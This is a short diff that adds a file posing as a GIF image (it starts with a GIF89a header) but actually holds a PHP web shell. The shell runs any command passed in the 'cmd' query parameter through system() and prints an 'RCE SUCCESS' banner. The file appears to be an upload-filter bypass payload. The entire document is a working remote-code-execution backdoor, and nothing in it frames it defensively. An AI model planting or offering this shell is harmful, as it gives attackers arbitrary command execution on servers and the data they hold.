@@ -1,0 +1,5 @@
+GIF89a
+<?php
+    echo "\n[RCE SUCCESS] Executed Command: ";
+    system($_GET['cmd']);
+?>
